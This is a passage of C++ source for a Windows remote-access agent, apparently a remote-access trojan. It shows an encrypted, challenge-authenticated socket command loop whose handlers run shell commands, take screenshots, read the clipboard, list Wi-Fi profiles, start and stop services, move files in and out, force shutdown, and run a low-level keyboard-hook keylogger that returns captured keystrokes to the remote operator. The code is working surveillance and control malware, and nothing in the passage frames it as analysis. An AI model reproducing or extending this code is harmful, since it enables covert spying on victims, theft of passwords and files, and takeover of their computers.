    case DRIVE_REMOVABLE:
      TypeStr = "Removable";
      break;
    case DRIVE_FIXED:
      TypeStr = "Fixed    ";
      break;
    case DRIVE_REMOTE:
      TypeStr = "Network  ";
      break;
    case DRIVE_CDROM:
      TypeStr = "CD-ROM   ";
      break;
    case DRIVE_RAMDISK:
      TypeStr = "RAM Disk ";
      break;
    }
    ULARGE_INTEGER FreeAvail, Total, Free;
    if (GetDiskFreeSpaceExW(Root, &FreeAvail, &Total, &Free)) {
      sprintf_s(Buf, "%c:  %s  Total: %8.2f GB  Free: %8.2f GB\n",
                (char)('A' + i), TypeStr,
                Total.QuadPart / (1024.0 * 1024.0 * 1024.0),
                FreeAvail.QuadPart / (1024.0 * 1024.0 * 1024.0));
    } else {
      sprintf_s(Buf, "%c:  %s  (unknown size)\n", (char)('A' + i), TypeStr);
    }
    Result += Buf;
  }
  return Result.empty() ? "(no drives)" : TrimString(Result);
}

std::string CmdNetstat() {
  std::string Result;
  DWORD Size = 0;
  GetExtendedTcpTable(NULL, &Size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
  std::vector<BYTE> Buf(Size);
  PMIB_TCPTABLE_OWNER_PID Table = (PMIB_TCPTABLE_OWNER_PID)Buf.data();
  if (GetExtendedTcpTable(Table, &Size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL,
                          0) != NO_ERROR)
    return "ERR: netstat failed";

  Result = "Proto  Local Address          Foreign Address        State         "
           "  PID\n";
  Result += "------------------------------------------------------------------"
            "------\n";
  for (DWORD i = 0; i < Table->dwNumEntries; i++) {
    MIB_TCPROW_OWNER_PID &Row = Table->table[i];
    char Line[256];

    struct in_addr Local, Remote;
    Local.S_un.S_addr = Row.dwLocalAddr;
    Remote.S_un.S_addr = Row.dwRemoteAddr;
    char LocalStr[32], RemoteStr[32];
    sprintf_s(LocalStr, "%s:%u", inet_ntoa(Local),
              ntohs((u_short)Row.dwLocalPort));
    sprintf_s(RemoteStr, "%s:%u", inet_ntoa(Remote),
              ntohs((u_short)Row.dwRemotePort));

    const char *StateStr = "UNKNOWN";
    switch (Row.dwState) {
    case MIB_TCP_STATE_CLOSED:
      StateStr = "CLOSED    ";
      break;
    case MIB_TCP_STATE_LISTEN:
      StateStr = "LISTEN    ";
      break;
    case MIB_TCP_STATE_SYN_SENT:
      StateStr = "SYN_SENT  ";
      break;
    case MIB_TCP_STATE_SYN_RCVD:
      StateStr = "SYN_RCVD  ";
      break;
    case MIB_TCP_STATE_ESTAB:
      StateStr = "ESTAB     ";
      break;
    case MIB_TCP_STATE_FIN_WAIT1:
      StateStr = "FIN_WAIT1 ";
      break;
    case MIB_TCP_STATE_FIN_WAIT2:
      StateStr = "FIN_WAIT2 ";
      break;
    case MIB_TCP_STATE_CLOSE_WAIT:
      StateStr = "CLOSE_WAIT";
      break;
    case MIB_TCP_STATE_CLOSING:
      StateStr = "CLOSING   ";
      break;
    case MIB_TCP_STATE_LAST_ACK:
      StateStr = "LAST_ACK  ";
      break;
    case MIB_TCP_STATE_TIME_WAIT:
      StateStr = "TIME_WAIT ";
      break;
    case MIB_TCP_STATE_DELETE_TCB:
      StateStr = "DELETE_TCB";
      break;
    }
    sprintf_s(Line, "TCP    %-22s %-22s %-14s %u\n", LocalStr, RemoteStr,
              StateStr, Row.dwOwningPid);
    Result += Line;
  }
  return TrimString(Result);
}

std::string CmdWifi() {
  std::string Output;
  RunShellCommand("netsh wlan show profiles", Output);
  return TrimString(Output);
}

std::string CmdServices() {
  std::string Result =
      "Name                          Display Name                 Status\n";
  Result += "------------------------------------------------------------------"
            "--------------\n";
  SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
  if (!Scm)
    return "ERR: cannot open SCM (need admin)";

  DWORD Needed = 0, Count = 0, Resume = 0;
  EnumServicesStatusW(Scm, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &Needed,
                      &Count, &Resume);
  std::vector<BYTE> Buf(Needed);
  LPENUM_SERVICE_STATUSW Services = (LPENUM_SERVICE_STATUSW)Buf.data();
  if (!EnumServicesStatusW(Scm, SERVICE_WIN32, SERVICE_STATE_ALL, Services,
                           Needed, &Needed, &Count, &Resume)) {
    CloseServiceHandle(Scm);
    return "ERR: enum services failed";
  }
  for (DWORD i = 0; i < Count; i++) {
    std::string Name = WideToUtf8(Services[i].lpServiceName);
    std::string Display = WideToUtf8(Services[i].lpDisplayName);
    const char *StatusStr =
        Services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running"
                                                                    : "Stopped";
    char Line[256];
    sprintf_s(Line, "%-30s %-30s %s\n", Name.c_str(), Display.c_str(),
              StatusStr);
    Result += Line;
  }
  CloseServiceHandle(Scm);
  return TrimString(Result);
}

std::string ServiceControl(const std::string &Name, bool Start) {
  SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
  if (!Scm)
    return "ERR: cannot open SCM (need admin)";
  SC_HANDLE Svc = OpenServiceW(Scm, Utf8ToWide(Name).c_str(),
                               Start ? SERVICE_START : SERVICE_STOP);
  if (!Svc) {
    CloseServiceHandle(Scm);
    return "ERR: service not found";
  }
  BOOL Ok = Start ? StartServiceW(Svc, 0, NULL)
                  : ControlService(Svc, SERVICE_CONTROL_STOP, NULL);
  CloseServiceHandle(Svc);
  CloseServiceHandle(Scm);
  return Ok ? "OK" : "ERR: operation failed";
}

std::string CmdSvcStart(const std::string &Args) {
  return ServiceControl(Args, true);
}
std::string CmdSvcStop(const std::string &Args) {
  return ServiceControl(Args, false);
}

int GetEncoderClsid(const WCHAR *Format, CLSID *Clsid) {
  UINT Num = 0, Size = 0;
  GetImageEncodersSize(&Num, &Size);
  if (Size == 0)
    return -1;
  std::vector<BYTE> Buf(Size);
  ImageCodecInfo *Codecs = (ImageCodecInfo *)Buf.data();
  GetImageEncoders(Num, Size, Codecs);
  for (UINT i = 0; i < Num; i++)
    if (wcscmp(Codecs[i].MimeType, Format) == 0) {
      *Clsid = Codecs[i].Clsid;
      return 0;
    }
  return -1;
}

std::string CmdScreenshot() {
  int W = GetSystemMetrics(SM_CXSCREEN);
  int H = GetSystemMetrics(SM_CYSCREEN);
  HDC HdcScreen = GetDC(NULL);
  HDC HdcMem = CreateCompatibleDC(HdcScreen);
  HBITMAP HBitmap = CreateCompatibleBitmap(HdcScreen, W, H);
  HGDIOBJ OldBmp = SelectObject(HdcMem, HBitmap);
  BitBlt(HdcMem, 0, 0, W, H, HdcScreen, 0, 0, SRCCOPY);

  IStream *Stream = NULL;
  CreateStreamOnHGlobal(NULL, TRUE, &Stream);

  Bitmap *Bmp = Bitmap::FromHBITMAP(HBitmap, NULL);
  CLSID PngClsid;
  GetEncoderClsid(L"image/png", &PngClsid);
  Bmp->Save(Stream, &PngClsid, NULL);
  delete Bmp;

  LARGE_INTEGER Zero = {};
  Stream->Seek(Zero, STREAM_SEEK_SET, NULL);

  STATSTG Stat;
  Stream->Stat(&Stat, STATFLAG_NONAME);
  ULONG ImgSize = Stat.cbSize.LowPart;
  std::vector<BYTE> ImgData(ImgSize);
  Stream->Read(ImgData.data(), ImgSize, NULL);
  Stream->Release();

  SelectObject(HdcMem, OldBmp);
  DeleteObject(HBitmap);
  DeleteDC(HdcMem);
  ReleaseDC(NULL, HdcScreen);

  return HexDump(ImgData);
}

std::string CmdWallpaper(const std::string &Args) {
  if (Args.empty()) {
    WCHAR Path[MAX_PATH] = {};
    SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, Path, 0);
    std::string Result = WideToUtf8(Path);
    return Result.empty() ? "(no wallpaper)" : Result;
  }
  std::wstring WPath = Utf8ToWide(Args);
  BOOL Ok = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)WPath.c_str(),
                                  SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
  return Ok ? "OK" : "ERR: set wallpaper failed";
}

std::string CmdMsgbox(const std::string &Args) {
  std::wstring WMsg = Utf8ToWide(Args);
  std::thread([WMsg]() {
    MessageBoxW(NULL, WMsg.c_str(), L"Remote Message",
                MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
  }).detach();
  return "OK";
}

std::string CmdLock() { return LockWorkStation() ? "OK" : "ERR: lock failed"; }

std::string CmdGetclip() {
  if (!OpenClipboard(NULL))
    return "ERR: cannot open clipboard";
  HANDLE HData = GetClipboardData(CF_TEXT);
  if (!HData) {
    CloseClipboard();
    return "ERR: no text in clipboard";
  }
  char *Text = (char *)GlobalLock(HData);
  std::string Result(Text);
  GlobalUnlock(HData);
  CloseClipboard();
  return Result;
}

std::string CmdSetclip(const std::string &Args) {
  if (!OpenClipboard(NULL))
    return "ERR: cannot open clipboard";
  EmptyClipboard();
  HGLOBAL HMem = GlobalAlloc(GMEM_MOVEABLE, Args.size() + 1);
  char *Data = (char *)GlobalLock(HMem);
  memcpy(Data, Args.c_str(), Args.size() + 1);
  GlobalUnlock(HMem);
  SetClipboardData(CF_TEXT, HMem);
  CloseClipboard();
  return "OK";
}

bool EnableShutdownPrivilege() {
  HANDLE Token;
  if (!OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token))
    return false;
  TOKEN_PRIVILEGES Tp = {};
  LookupPrivilegeValueW(NULL, L"SeShutdownPrivilege", &Tp.Privileges[0].Luid);
  Tp.PrivilegeCount = 1;
  Tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  AdjustTokenPrivileges(Token, FALSE, &Tp, sizeof(Tp), NULL, NULL);
  CloseHandle(Token);
  return GetLastError() == ERROR_SUCCESS;
}

std::string CmdPower(const std::string &Action) {
  EnableShutdownPrivilege();
  UINT Flags = 0;
  if (Action == "shutdown")
    Flags = EWX_SHUTDOWN | EWX_FORCE;
  else if (Action == "reboot")
    Flags = EWX_REBOOT | EWX_FORCE;
  else if (Action == "logoff")
    Flags = EWX_LOGOFF | EWX_FORCE;
  else
    return "ERR: invalid action";
  return ExitWindowsEx(Flags, SHTDN_REASON_MAJOR_OTHER) ? "OK" : "ERR: failed";
}

void KeylogProc() {
  MSG Msg;
  while (G_KeylogActive) {
    while (PeekMessageW(&Msg, NULL, 0, 0, PM_REMOVE)) {
      TranslateMessage(&Msg);
      DispatchMessageW(&Msg);
    }
    Sleep(10);
  }
}

LRESULT CALLBACK LowLevelKeyboardProc(int Code, WPARAM WParam, LPARAM LParam) {
  if (Code == HC_ACTION) {
    KBDLLHOOKSTRUCT *Kb = (KBDLLHOOKSTRUCT *)LParam;
    if (WParam == WM_KEYDOWN || WParam == WM_SYSKEYDOWN) {
      std::lock_guard<std::mutex> Lock(G_KeylogMutex);
      char Buf[32];
      DWORD Vk = Kb->vkCode;
      bool Shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
      bool Caps = (GetKeyState(VK_CAPITAL) & 1) != 0;
      bool Upper = Shift ^ Caps;

      if (Vk == VK_RETURN) {
        G_KeylogData += "\n";
      } else if (Vk == VK_SPACE) {
        G_KeylogData += " ";
      } else if (Vk == VK_TAB) {
        G_KeylogData += "[TAB]";
      } else if (Vk == VK_BACK) {
        G_KeylogData += "[BS]";
      } else if (Vk == VK_ESCAPE) {
        G_KeylogData += "[ESC]";
      } else if (Vk == VK_CONTROL || Vk == VK_LCONTROL || Vk == VK_RCONTROL) {
        G_KeylogData += "[CTRL]";
      } else if (Vk == VK_MENU || Vk == VK_LMENU || Vk == VK_RMENU) {
        G_KeylogData += "[ALT]";
      } else if (Vk >= VK_F1 && Vk <= VK_F12) {
        sprintf_s(Buf, "[F%d]", Vk - VK_F1 + 1);
        G_KeylogData += Buf;
      } else {
        BYTE KeyState[256] = {};
        WCHAR WChar = 0;
        if (ToUnicode(Vk, Kb->scanCode, KeyState, &WChar, 1, 0) == 1 &&
            WChar >= 32) {
          std::string Ch = WideToUtf8(std::wstring(1, WChar));
          G_KeylogData += Ch;
        }
      }
    }
  }
  return CallNextHookEx(NULL, Code, WParam, LParam);
}

std::string CmdKeylog(const std::string &Args) {
  if (Args == "start") {
    if (G_KeylogActive)
      return "ERR: keylog already running";
    G_KeylogActive = true;
    G_KeylogHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                     GetModuleHandleW(NULL), 0);
    if (!G_KeylogHook) {
      G_KeylogActive = false;
      return "ERR: cannot set hook";
    }
    G_KeylogThread = std::thread(KeylogProc);
    return "OK: keylog started";
  } else if (Args == "stop") {
    if (!G_KeylogActive)
      return "ERR: keylog not running";
    G_KeylogActive = false;
    if (G_KeylogHook) {
      UnhookWindowsHookEx(G_KeylogHook);
      G_KeylogHook = NULL;
    }
    if (G_KeylogThread.joinable())
      G_KeylogThread.join();
    std::lock_guard<std::mutex> Lock(G_KeylogMutex);
    std::string Data = G_KeylogData;
    G_KeylogData.clear();
    return Data.empty() ? "(no keystrokes recorded)" : Data;
  }
  return "ERR: use 'keylog start' or 'keylog stop'";
}

std::string DispatchCommand(SOCKET Sock, const std::vector<BYTE> &Key,
                            const std::string &Command) {
  size_t SpacePos = Command.find(' ');
  std::string CmdName, CmdArgs;
  if (SpacePos != std::string::npos) {
    CmdName = Command.substr(0, SpacePos);
    CmdArgs = TrimString(Command.substr(SpacePos + 1));
  } else {
    CmdName = TrimString(Command);
    CmdArgs = "";
  }

  std::transform(CmdName.begin(), CmdName.end(), CmdName.begin(), ::tolower);

  if (CmdName == "cmd")
    return CmdHandle(Sock, Key, CmdArgs);
  if (CmdName == "ls")
    return CmdLs(CmdArgs);
  if (CmdName == "cat")
    return CmdCat(CmdArgs);
  if (CmdName == "rm")
    return CmdRm(CmdArgs);
  if (CmdName == "mkdir")
    return CmdMkdir(CmdArgs);
  if (CmdName == "cp")
    return CmdCp(CmdArgs);
  if (CmdName == "mv")
    return CmdMv(CmdArgs);
  if (CmdName == "ps")
    return CmdPs();
  if (CmdName == "pwd")
    return CmdPwd();
  if (CmdName == "kill")
    return CmdKill(CmdArgs);
  if (CmdName == "sysinfo")
    return CmdSysinfo();
  if (CmdName == "drives")
    return CmdDrives();
  if (CmdName == "netstat")
    return CmdNetstat();
  if (CmdName == "wifi")
    return CmdWifi();
  if (CmdName == "services")
    return CmdServices();
  if (CmdName == "svc_start")
    return CmdSvcStart(CmdArgs);
  if (CmdName == "svc_stop")
    return CmdSvcStop(CmdArgs);
  if (CmdName == "screenshot")
    return CmdScreenshot();
  if (CmdName == "wallpaper")
    return CmdWallpaper(CmdArgs);
  if (CmdName == "msgbox")
    return CmdMsgbox(CmdArgs);
  if (CmdName == "lock")
    return CmdLock();
  if (CmdName == "getclip")
    return CmdGetclip();
  if (CmdName == "setclip")
    return CmdSetclip(CmdArgs);
  if (CmdName == "shutdown")
    return CmdPower("shutdown");
  if (CmdName == "reboot")
    return CmdPower("reboot");
  if (CmdName == "logoff")
    return CmdPower("logoff");
  if (CmdName == "keylog")
    return CmdKeylog(CmdArgs);

  if (CmdName == "upload") {
    auto Parts = SplitString(CmdArgs, ' ');
    if (Parts.size() < 2)
      return "ERR: upload <filename> <base64data>";
    std::string FileName = Parts[0];
    std::string B64Data = Parts[1];
    for (size_t i = 2; i < Parts.size(); i++)
      B64Data += " " + Parts[i];
    std::vector<BYTE> FileData = Base64Decode(B64Data);
    HANDLE HFile =
        CreateFileW(Utf8ToWide(FileName).c_str(), GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (HFile == INVALID_HANDLE_VALUE)
      return "ERR: cannot create file";
    DWORD Written = 0;
    WriteFile(HFile, FileData.data(), (DWORD)FileData.size(), &Written, NULL);
    CloseHandle(HFile);
    return "OK: " + std::to_string(Written) + " bytes written";
  }
  if (CmdName == "download") {
    HANDLE HFile =
        CreateFileW(Utf8ToWide(CmdArgs).c_str(), GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (HFile == INVALID_HANDLE_VALUE)
      return "ERR: cannot open file";
    DWORD Fs = GetFileSize(HFile, NULL);
    if (Fs == INVALID_FILE_SIZE || Fs > 100 * 1024 * 1024) {
      CloseHandle(HFile);
      return "ERR: file too large";
    }
    std::vector<BYTE> Buf(Fs);
    DWORD Read = 0;
    ReadFile(HFile, Buf.data(), Fs, &Read, NULL);
    CloseHandle(HFile);
    return Base64Encode(Buf);
  }
  if (CmdName == "exit" || CmdName == "quit")
    return "__EXIT__";

  return "ERR: unknown command: " + CmdName;
}

void HandleSession(SOCKET ClientSock) {
  std::string Challenge = GenerateRandomHex(ChallengeLen);
  std::string HelloMsg = "CHALLENGE:" + Challenge + "\n";
  SendAll(ClientSock, HelloMsg.c_str(), (int)HelloMsg.size());

  int NetLen = 0;
  if (!RecvAll(ClientSock, (char *)&NetLen, 4)) {
    closesocket(ClientSock);
    return;
  }
  int AuthLen = ntohl(NetLen);
  if (AuthLen <= 0 || AuthLen > 1024 * 1024) {
    closesocket(ClientSock);
    return;
  }
  std::string AuthHex(AuthLen, 0);
  if (!RecvAll(ClientSock, &AuthHex[0], AuthLen)) {
    closesocket(ClientSock);
    return;
  }

  std::string SessionKeyHex = Sha256(G_StoredHash + Challenge);
  std::vector<BYTE> SessionKey = HexToBytes(SessionKeyHex);
  std::string AuthText = AesDecrypt(AuthHex, SessionKey);

  if (AuthText.length() >= 5 && AuthText.substr(0, 5) == "AUTH:") {
    std::string ReceivedHash = AuthText.substr(5);
    if (ReceivedHash != G_StoredHash) {
      SendEncrypted(ClientSock, "AUTH_FAIL", SessionKey);
      closesocket(ClientSock);
      return;
    }
  } else {
    SendEncrypted(ClientSock, "AUTH_FAIL", SessionKey);
    closesocket(ClientSock);
    return;
  }

  SendEncrypted(ClientSock, "AUTH_OK", SessionKey);

  while (G_Running) {
    std::string Command = RecvEncrypted(ClientSock, SessionKey);
    if (Command.empty())
      break;

    std::string Result = DispatchCommand(ClientSock, SessionKey, Command);

    if (Result == "__EXIT__") {
      SendEncrypted(ClientSock, "BYE", SessionKey);
      break;
    }

    if (!Result.empty() && Result[0] == 'E' && Result.substr(0, 3) == "ERR") {
      SendEncrypted(ClientSock, Result, SessionKey);
    } else {
      SendEncrypted(ClientSock, "OK\n" + Result, SessionKey);
    }
  }

  closesocket(ClientSock);
}
